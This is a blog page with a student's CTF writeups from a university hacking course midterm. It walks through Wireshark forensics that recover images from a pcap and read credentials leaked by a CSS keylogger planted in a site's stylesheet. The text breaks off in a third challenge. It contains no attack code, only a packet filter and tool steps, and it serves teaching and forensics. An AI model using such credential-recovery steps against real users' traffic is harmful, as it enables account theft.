<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[NSYSU Hacking Attack & Defense] Midterm Writeups - Cyris | Limit Break</title><meta name=Description content="NSYSU Hacking and Countermeasures course midterm writeups"><meta property="og:url" content="https://blog.cyris.tw/en/posts/2020/nsysu-htcf-midterm-writeups/"><meta property="og:site_name" content="Cyris | Limit Break"><meta property="og:title" content="[NSYSU Hacking Attack & Defense] Midterm Writeups"><meta property="og:description" content="NSYSU Hacking and Countermeasures course midterm writeups"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-09T00:00:00+00:00"><meta property="article:modified_time" content="2020-11-09T00:00:00+00:00"><meta property="article:tag" content="NSYSU Hacking Attack & Defense"><meta property="article:tag" content="CTF-Writeup"><meta property="og:image" content="https://blog.cyris.tw/img/cyris.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.cyris.tw/img/cyris.png"><meta name=twitter:title content="[NSYSU Hacking Attack & Defense] Midterm Writeups"><meta name=twitter:description content="NSYSU Hacking and Countermeasures course midterm writeups"><meta name=application-name content="Cyris | Limit Break"><meta name=apple-mobile-web-app-title content="Cyris | Limit Break"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/img/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://blog.cyris.tw/en/posts/2020/nsysu-htcf-midterm-writeups/><link rel=prev href=https://blog.cyris.tw/en/posts/2020/nsysu-htcf-hw1/><link rel=next href=https://blog.cyris.tw/en/posts/2020/nsysu-htcf-hw2/><link rel=stylesheet href=/css/main.min.css><link rel=stylesheet href=/css/style.min.css><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.cyris.tw/en/posts/2020/nsysu-htcf-midterm-writeups/"},"image":["https://blog.cyris.tw/img/cyris.png"],"genre":"posts","keywords":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"wordcount":1422,"url":"https://blog.cyris.tw/en/posts/2020/nsysu-htcf-midterm-writeups/","datePublished":"2020-11-09T00:00:00+00:00","dateModified":"2020-11-09T00:00:00+00:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"Cyris","logo":"https://blog.cyris.tw/img/cyris.png"},"author":{"@type":"Person","name":"Cyris","url":"https://blog.cyris.tw"},"description":"NSYSU Hacking and Countermeasures course midterm writeups"}</script></head><body data-instant-intensity=viewport class="tw-flex tw-min-h-screen tw-flex-col"><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.className=e,document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),e==="light"?document.documentElement.classList.remove("tw-dark"):document.documentElement.classList.add("tw-dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#161b22"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><header class="desktop print:!tw-hidden" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/en/ title="Cyris | Limit Break"><img class="tw-inline tw-align-text-bottom tw-mr-1" src=/img/favicon.ico alt="Cyris | Limit Break" height=32 width=32>Cyris | Limit Break</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/en/posts/>Posts </a><a class=menu-item href=/en/tags/>Tags </a><a class=menu-item href=/en/categories/>Categories </a><a class=menu-item href=/en/about/>About </a><span class="menu-item delimiter"></span><span class="menu-item language-switcher" title="Select Language"><a href=/en/posts/2020/nsysu-htcf-midterm-writeups/ class="lang-option active">EN</a><a href=/posts/2020/nsysu-htcf-midterm-writeups/ class=lang-option>中文</a></span><button class="menu-item theme-switch" aria-label="Switch Theme">
<svg class="icon" viewBox="0 0 512 512"><path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705.0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/></svg></button></div></div></div></header><header class="mobile print:!tw-hidden" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/en/ title="Cyris | Limit Break"><img class="tw-inline tw-align-text-bottom tw-mr-1" src=/img/favicon.ico alt="Cyris | Limit Break" height=32 width=32>Cyris | Limit Break</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/en/posts/ title>Posts</a><a class=menu-item href=/en/tags/ title>Tags</a><a class=menu-item href=/en/categories/ title>Categories</a><a class=menu-item href=/en/about/ title>About</a><button class="menu-item theme-switch tw-w-full" aria-label="Switch Theme">
<svg class="icon" viewBox="0 0 512 512"><path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705.0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/></svg></button><div class="menu-item language-switcher-mobile tw-w-full"><a href=/en/posts/2020/nsysu-htcf-midterm-writeups/ class="lang-option active">EN</a><a href=/posts/2020/nsysu-htcf-midterm-writeups/ class=lang-option>中文</a></div></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class="tw-mx-4 tw-flex-1"><div class="toc print:!tw-hidden" id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#scoreboard>Scoreboard</a></li><li><a href=#forensics>Forensics</a><ul><li><a href=#images-0x1-100-points-23-solves>images 0x1 (100 points, 23 solves)</a><ul><li><a href=#description>Description</a></li><li><a href=#solution>Solution</a></li></ul></li><li><a href=#css-keylogger-150-points-8-solves>CSS-Keylogger (150 points, 8 solves)</a><ul><li><a href=#description-1>Description</a></li><li><a href=#solution-1>Solution</a></li></ul></li><li><a href=#images-0x2-250-points-1-solve>images 0x2 (250 points, 1 solve)</a><ul><li><a href=#description-2>Description</a></li><li><a href=#solution-2>Solution</a></li></ul></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#hashmeow-120-points-2-solves>hashmeow (120 points, 2 solves)</a><ul><li><a href=#description-3>Description</a></li><li><a href=#solution-3>Solution</a></li></ul></li><li><a href=#hashmeow-root-50-points-1-solve>hashmeow root (50 points, 1 solve)</a><ul><li><a href=#description-4>Description</a></li><li><a href=#solution-4>Solution</a></li></ul></li><li><a href=#proftpd-120-points-0-solve>ProFTPD (120 points, 0 solve)</a><ul><li><a href=#description-5>Description</a></li><li><a href=#solution-5>Solution</a></li></ul></li></ul></li></ul></nav></div></div><dialog id=toc-dialog class="tw-max-w-full tw-w-full tw-max-h-full tw-h-full tw-ml-16"><div class="toc tw-mx-4 tw-max-w-full"><h2 class="tw-mx-0 tw-my-6 tw-uppercase tw-text-2xl">Contents</h2><div class=toc-content><nav id=TableOfContents><ul><li><a href=#scoreboard>Scoreboard</a></li><li><a href=#forensics>Forensics</a><ul><li><a href=#images-0x1-100-points-23-solves>images 0x1 (100 points, 23 solves)</a><ul><li><a href=#description>Description</a></li><li><a href=#solution>Solution</a></li></ul></li><li><a href=#css-keylogger-150-points-8-solves>CSS-Keylogger (150 points, 8 solves)</a><ul><li><a href=#description-1>Description</a></li><li><a href=#solution-1>Solution</a></li></ul></li><li><a href=#images-0x2-250-points-1-solve>images 0x2 (250 points, 1 solve)</a><ul><li><a href=#description-2>Description</a></li><li><a href=#solution-2>Solution</a></li></ul></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#hashmeow-120-points-2-solves>hashmeow (120 points, 2 solves)</a><ul><li><a href=#description-3>Description</a></li><li><a href=#solution-3>Solution</a></li></ul></li><li><a href=#hashmeow-root-50-points-1-solve>hashmeow root (50 points, 1 solve)</a><ul><li><a href=#description-4>Description</a></li><li><a href=#solution-4>Solution</a></li></ul></li><li><a href=#proftpd-120-points-0-solve>ProFTPD (120 points, 0 solve)</a><ul><li><a href=#description-5>Description</a></li><li><a href=#solution-5>Solution</a></li></ul></li></ul></li></ul></nav></div></div></dialog><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single print:!tw-w-full print:!tw-max-w-none print:!tw-m-0 print:!tw-p-0"><h1 class=single-title data-pagefind-meta=date:2020-11-09 data-pagefind-body>[NSYSU Hacking Attack & Defense] Midterm Writeups</h1><div class=post-meta><div class=post-meta-line><span class=post-author><svg class="icon" viewBox="0 0 496 512"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6.0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7.0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4.0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9s28-2.7 40.9-6.9c2.3-.7 4.7-1.1 7.1-1.1 42.9.0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"/></svg><a href=https://blog.cyris.tw title=Author target=_blank rel="noopener noreferrer author" class=author>Cyris</a>
</span>&nbsp;<span class=post-category>included in </span>&nbsp;<span class=post-category>included in <a href=/en/categories/cyber-security/><svg class="icon" viewBox="0 0 512 512"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>Cyber Security</a></span></div><div class=post-meta-line><svg class="icon" viewBox="0 0 448 512"><path d="M148 288h-40c-6.6.0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v40c0 6.6-5.4 12-12 12zm108-12v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm-96 96v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm-96 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm192 0v-40c0-6.6-5.4-12-12-12h-40c-6.6.0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6.0 12-5.4 12-12zm96-260v352c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6.0 12 5.4 12 12v52h48c26.5.0 48 21.5 48 48zm-48 346V160H48v298c0 3.3 2.7 6 6 6h340c3.3.0 6-2.7 6-6z"/></svg>&nbsp;<time datetime=2020-11-09>2020-11-09</time>&nbsp;<svg class="icon" viewBox="0 0 576 512"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg>&nbsp;<time datetime=2020-11-09>2020-11-09</time>&nbsp;<svg class="icon" viewBox="0 0 512 512"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3.0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9.0l60.1 60.1c18.8 18.7 18.8 49.1.0 67.9zM284.2 99.8 21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3.0-17l-111-111c-4.8-4.7-12.4-4.7-17.1.0zM124.1 339.9c-5.5-5.5-5.5-14.3.0-19.8l154-154c5.5-5.5 14.3-5.5 19.8.0s5.5 14.3.0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8.0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;1422 words&nbsp;
<svg class="icon" viewBox="0 0 512 512"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5.0-2e2-89.5-2e2-2e2S145.5 56 256 56s2e2 89.5 2e2 2e2-89.5 2e2-2e2 2e2zm61.8-104.4-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6.0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;7 minutes&nbsp;</div></div><div class=post-disclaimer><strong>Note:</strong> This article was translated from Chinese by AI. The original content may have nuances that differ from the translation.</div><div class="details toc print:!tw-block" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
<span class=details-icon><svg class="icon" viewBox="0 0 256 512"><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9.0l-22.6-22.6c-9.4-9.4-9.4-24.6.0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6.0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9.0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#scoreboard>Scoreboard</a></li><li><a href=#forensics>Forensics</a><ul><li><a href=#images-0x1-100-points-23-solves>images 0x1 (100 points, 23 solves)</a><ul><li><a href=#description>Description</a></li><li><a href=#solution>Solution</a></li></ul></li><li><a href=#css-keylogger-150-points-8-solves>CSS-Keylogger (150 points, 8 solves)</a><ul><li><a href=#description-1>Description</a></li><li><a href=#solution-1>Solution</a></li></ul></li><li><a href=#images-0x2-250-points-1-solve>images 0x2 (250 points, 1 solve)</a><ul><li><a href=#description-2>Description</a></li><li><a href=#solution-2>Solution</a></li></ul></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#hashmeow-120-points-2-solves>hashmeow (120 points, 2 solves)</a><ul><li><a href=#description-3>Description</a></li><li><a href=#solution-3>Solution</a></li></ul></li><li><a href=#hashmeow-root-50-points-1-solve>hashmeow root (50 points, 1 solve)</a><ul><li><a href=#description-4>Description</a></li><li><a href=#solution-4>Solution</a></li></ul></li><li><a href=#proftpd-120-points-0-solve>ProFTPD (120 points, 0 solve)</a><ul><li><a href=#description-5>Description</a></li><li><a href=#solution-5>Solution</a></li></ul></li></ul></li></ul></nav></div></div><div class=content id=content data-pagefind-body><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/monkey_flag.png alt=" "></p><p>Writeups from <a href=https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF-CTF-2020/midterm/readme.md target=_blank rel="noopener noreferrer">MacacaHub HTCF Midterm writeups</a></p><p>Author: <strong>@stavhaygn</strong>
Writeup By: <strong>@yctseng1227</strong></p><br><p>This Hacking Attack & Defense exam had written test (1hr) & practical exam (2hr) - basically Golden Shield Competition 2.0. Time allocation made it difficult to clear all challenges. Plus, to prevent cheating, we had to take screenshots while solving for simple reports (so troublesome). Difficulty was medium-easy in my opinion, since the TA followed the professor&rsquo;s teaching direction (even some extended learning). But most classmates lacked CTF experience making it somewhat difficult - the professor eventually suggested adding more basic challenges next time XDDDDDD</p><p>As usual, here&rsquo;s my score proof. Lost 1st place to a MacacaHub junior, so sad
(The only wrong one was a typo in the Flag image, life stain)</p><p><img class=tw-inline loading=lazy src=https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp alt=" "></p><h2 id=scoreboard class=headerLink><a href=#scoreboard class=header-mark></a>Scoreboard</h2><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/scoreboard.png alt=" "></p><h2 id=forensics class=headerLink><a href=#forensics class=header-mark></a>Forensics</h2><h3 id=images-0x1-100-points-23-solves class=headerLink><a href=#images-0x1-100-points-23-solves class=header-mark></a>images 0x1 (100 points, 23 solves)</h3><h4 id=description class=headerLink><a href=#description class=header-mark></a>Description</h4><p>images~ images~ images~
<strong>hint</strong>: flag is in the image</p><p><a href=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/images_0x1.pcap target=_blank rel="noopener noreferrer">Released file (pcap)</a></p><h4 id=solution class=headerLink><a href=#solution class=header-mark></a>Solution</h4><div class="details admonition note open"><div class="details-summary admonition-title"><span class=icon><svg class="icon" viewBox="0 0 512 512"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3.0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9.0l60.1 60.1c18.8 18.7 18.8 49.1.0 67.9zM284.2 99.8 21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3.0-17l-111-111c-4.8-4.7-12.4-4.7-17.1.0zM124.1 339.9c-5.5-5.5-5.5-14.3.0-19.8l154-154c5.5-5.5 14.3-5.5 19.8.0s5.5 14.3.0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8.0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg></span>Note<span class=details-icon><svg class="icon" viewBox="0 0 256 512"><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9.0l-22.6-22.6c-9.4-9.4-9.4-24.6.0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6.0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9.0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></span></div><div class=details-content><div class=admonition-content>Heard many people solved this cleanly with NetworkMiner(?)
But packet count was low during exam so I didn&rsquo;t think much - my approach is more manual</div></div></div><p>Opening .pcap with wireshark, <code>Follow > TCP Stream</code> shows roughly 10 streams. Many contain .png headers as shown.
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/01.png alt=" "></p><p>Use <code>File > Export Objects > HTTP...</code> to dump specified files (focus on multipart/form-data).
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/02.png alt=" "></p><p>Save all files, then use hex editor to fix image headers according to <a href=https://en.wikipedia.org/wiki/Portable_Network_Graphics target=_blank rel="noopener noreferrer">PNG</a>.
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/image%200x1/pic/03.png alt=" "></p><p>After fixing images, Flag is visible. About five images total - I randomly poked and got the Flag haha</p><h3 id=css-keylogger-150-points-8-solves class=headerLink><a href=#css-keylogger-150-points-8-solves class=header-mark></a>CSS-Keylogger (150 points, 8 solves)</h3><h4 id=description-1 class=headerLink><a href=#description-1 class=header-mark></a>Description</h4><p>Interesting CSS Keylogger articles:
<a href=https://blog.techbridge.cc/2018/03/02/css-key-logger/ target=_blank rel="noopener noreferrer">CSS keylogger: Attack and Defense</a>
<a href=https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense target=_blank rel="noopener noreferrer">Stealing Data With CSS: Attack and Defense</a></p><p>Try to analyze this CSS Keylogger attack in the packet and find the victim&rsquo;s email and password on c7f website, then try to login</p><p><strong>hint</strong>: Good luck or skill to get the flag in the mini-game</p><p>Website: <code>http://c7f.macacahub.tw/login</code>
<a href=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/CSS_Keylogger.pcap target=_blank rel="noopener noreferrer">Released file (pcap)</a></p><h4 id=solution-1 class=headerLink><a href=#solution-1 class=header-mark></a>Solution</h4><p>The two articles on CSS Keylogger are supplementary material.
Researching the site reveals it was hacked - CSS Keylogger is in <code>bootstrap.min.css</code> (you can solve without knowing this XD).
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/01.png alt=" "></p><p>Website source code shows login validates email format and password is salted then hashed - don&rsquo;t expect to crack the hash from packets =w=</p><p>From .pcap&rsquo;s <code>Follow > TCP Stream</code>, observe CSS Keylogger parameters as mentioned in articles.</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/02.png alt=" "></p><p><code>/e/</code> indicates email, <code>/p/</code> indicates password - also a hint.
Organizing observed packet features, filter them out (or slowly click through TCP Stream XD).</p><div class="code-block highlight is-open show-line-numbers tw-group tw-my-2"><div class="tw-flex
tw-flex-row
tw-flex-1
tw-justify-between
tw-w-full tw-bg-bgColor-secondary"><button class="code-block-button
tw-mx-2
tw-flex
tw-flex-row
tw-flex-1" aria-hidden=true><div class="group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1"><svg class="icon" viewBox="0 0 320 512"><path d="M285.476 272.971 91.132 467.314c-9.373 9.373-24.569 9.373-33.941.0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941.0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"/></svg></div><p class="tw-select-none !tw-my-1">text</p></button><div class=tw-flex><button class="line-number-button
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.show-line-numbers]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle line numbers"><svg class="icon" viewBox="0 0 512 512"><path d="M61.77 401l17.5-20.15a19.92 19.92.0 005.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 00-8 8v16a8 8 0 008 8h22.83a157.41 157.41.0 00-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33.0 15.94 2.44 15.94 9.09.0 4.72-4.2 8.22-14.36 8.22a41.54 41.54.0 01-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16.0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zm0-160H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16V80a16 16 0 00-16-16zm0 320H176a16 16 0 00-16 16v32a16 16 0 0016 16h320a16 16 0 0016-16v-32a16 16 0 00-16-16zM16 160h64a8 8 0 008-8v-16a8 8 0 00-8-8H64V40a8 8 0 00-8-8H32a8 8 0 00-7.14 4.42l-8 16A8 8 0 0024 64h8v64H16a8 8 0 00-8 8v16a8 8 0 008 8zm-3.91 160H80a8 8 0 008-8v-16a8 8 0 00-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44.0-29.06-25-39.56-44.47-39.56-21.36.0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44.0 019.46-3.84c3.33.0 9.28 1.56 9.28 8.75C51 248.19.0 257.31.0 304.59v4C0 316 5.08 320 12.09 320z"/></svg></button>
<button class="wrap-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
group-[.is-wrap]:tw-text-fgColor-link
print:!tw-hidden" title="Toggle code wrap"><svg class="icon" viewBox="0 0 448 512"><path d="M16 132h416c8.837.0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163.0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg></button>
<button class="copy-code-button
tw-select-none
tw-mx-2
tw-hidden
group-[.is-open]:tw-block
hover:tw-text-fgColor-link
print:!tw-hidden" title="Copy code">
<span class="copy-icon tw-block"><svg class="icon" viewBox="0 0 448 512"><path d="M433.941 65.941l-51.882-51.882A48 48 0 00348.118.0H176c-26.51.0-48 21.49-48 48v48H48c-26.51.0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51.0 48-21.49 48-48v-48h80c26.51.0 48-21.49 48-48V99.882a48 48 0 00-14.059-33.941zM266 464H54a6 6 0 01-6-6V150a6 6 0 016-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 01-6 6zm128-96H182a6 6 0 01-6-6V54a6 6 0 016-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 01-6 6zm6-256h-64V48h9.632c1.591.0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 011.757 4.243V112z"/></svg></span>
<span class="check-icon tw-hidden"><svg class="icon" viewBox="0 0 512 512"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206.0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204.0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204.0l36.203 36.204c9.997 9.997 9.997 26.206.0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
</button>
<button class="tw-select-none
tw-mx-2
tw-block
group-[.is-open]:tw-hidden
print:!tw-hidden" disabled aria-hidden=true><svg class="icon" viewBox="0 0 512 512"><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button></div></div><pre style=counter-reset:codeblock class="tw-block tw-m-0 tw-p-0"><code id=codeblock-id-1 class="chroma
!tw-block
tw-p-0
tw-m-0
tw-transition-[max-height]
tw-duration-500
tw-ease-in-out
group-[.is-closed]:!tw-max-h-0
group-[.is-wrap]:tw-text-wrap
tw-overflow-y-hidden
tw-overflow-x-auto
tw-scrollbar-thin"><span class=line><span class=cl>http &amp;&amp; ip.dst == 45.79.159.73</span></span></code></pre></div><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/03.png alt=" "></p><p>Got three accounts. Then some luck trying to login&mldr; yes, I say this because I tried credentials for 30 minutes without success, finally gave up and mysteriously logged in XDDDDDD
Post-competition discussion with TA had no clear conclusion. Share thoughts if any QQ</p><p>After login&mldr; catch the monkeys!!
<img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/04.gif alt=" "></p><p>Only one of five monkeys gives Flag when clicked. To avoid mouse clicking, shrink window to trap them, or directly open source code to find the link for Flag!!</p><p><img class=tw-inline loading=lazy src=https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/midterm/CSS-Keylogger/pic/05.png alt=" "></p><h3 id=images-0x2-250-points-1-solve class=headerLink><a href=#images-0x2-250-points-1-solve class=header-mark></a>images 0x2 (250 points, 1 solve)</h3><h4 id=description-2 class=headerLink><a href=#description-2 class=header-mark></a>Description</h4><p>Kids use tools to solve challenges, adults write code</p><p><a 